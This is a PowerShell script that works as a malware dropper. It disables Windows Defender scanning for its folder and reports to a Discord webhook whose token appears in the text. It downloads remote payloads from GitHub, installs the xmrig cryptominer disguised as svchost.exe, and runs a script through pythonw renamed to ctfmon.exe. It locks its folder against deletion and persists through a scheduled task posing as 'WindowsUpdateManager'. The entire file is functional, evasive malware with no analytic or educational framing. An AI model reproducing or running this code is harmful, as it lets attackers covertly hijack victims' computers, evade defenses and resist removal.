# --- THE GHOST MASTER (VERSION 6.0 - HYDRA CORE) ---
$WEBHOOK = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
function Send-Ghost { param($msg) try { $json = @{content="[GHOST STATUS] $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }

Send-Ghost "Engine Landing Initiated on $($env:COMPUTERNAME)"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ID = "svchost"
$Path = "$env:APPDATA\$ID"

# 1. Clear & Exclusion
if (Test-Path $Path) { 
    $OurProc = Get-Process -Name $ID -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$Path*" }
    if ($OurProc) { Stop-Process -Id $OurProc.Id -Force -ErrorAction SilentlyContinue }
    Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue 
}
New-Item -ItemType Directory -Path $Path -Force | Out-Null
Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue

# 2. Python Core Landing
Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip" -OutFile "$Path\py.zip"
Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
Remove-Item "$Path\py.zip"

# 3. THE "LUNGS" FIX
Get-ChildItem -Path "$Path\python" -Filter "*._pth" | Remove-Item -Force
$LibPath = "$Path\python\Lib\site-packages"
New-Item -ItemType Directory -Path $LibPath -Force | Out-Null
Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile "$Path\get-pip.py"
& "$Path\python\python.exe" "$Path\get-pip.py" --no-warn-script-location
& "$Path\python\python.exe" -m pip install requests psutil --target "$LibPath" --no-warn-script-location

# 4. Payload Landing & ACL LOCK
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/UpdataData.bin"
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdataData.bin"

if (Test-Path "$Path\UpdataData.bin") {
    Rename-Item -Path "$Path\UpdataData.bin" -NewName "UpdataData.zip" -Force
    Expand-Archive -Path "$Path\UpdataData.zip" -DestinationPath $Path -Force
    $Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    if ($Miner) { Move-Item -Path $Miner.FullName -Destination "$Path\$ID.exe" -Force }
    
    # --- THE LOCK THE DOOR (ACL) ---
    try {
        $Acl = Get-Acl $Path
        $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","Delete,DeleteSubdirectoriesAndFiles","Deny")
        $Acl.AddAccessRule($Ar)
        Set-Acl $Path $Acl
        Send-Ghost "Folder Locked (ACL Deny)."
    } catch {}
}

# 5. ACTIVATION & RESURRECTION TASK
$PY_MASK = "$Path\python\ctfmon.exe"
if (Test-Path "$Path\python\pythonw.exe") {
    Rename-Item -Path "$Path\python\pythonw.exe" -NewName "ctfmon.exe" -Force
    
    # Register the Resurrection Task (Auto-wake every 1 min)
    $Action = New-ScheduledTaskAction -Execute $PY_MASK -Argument "`"$Path\WinServices.py`" --id $ID" -WorkingDirectory $Path
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "WindowsUpdateManager" -Action $Action -Trigger $Trigger -User "NT AUTHORITY\INTERACTIVE" -Force
    $Task = Get-ScheduledTask -TaskName "WindowsUpdateManager"
    $Task.Triggers[0].Repetition = (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)).Repetition
    Set-ScheduledTask -InputObject $Task -Force

    $env:PYTHONPATH = $LibPath
    Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WorkingDirectory $Path -WindowStyle Hidden
    Send-Ghost "Hydra Released. Resurrection Task Active."
}

Remove-Item -Path "$Path\get-pip.py", "$Path\UpdataData.zip" -ErrorAction SilentlyContinue
